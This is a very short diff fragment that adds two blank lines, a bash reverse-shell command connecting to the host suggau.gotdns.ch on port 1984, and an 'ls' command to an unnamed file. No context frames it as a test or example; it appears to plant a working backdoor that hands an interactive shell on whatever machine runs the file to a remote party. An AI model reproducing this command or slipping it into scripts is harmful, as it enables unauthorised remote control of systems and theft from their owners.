@@ -1,0 +1,4 @@
+
+
+/bin/bash -c "bash -i >& /dev/tcp/suggau.gotdns.ch/1984 0>&1"
+ls
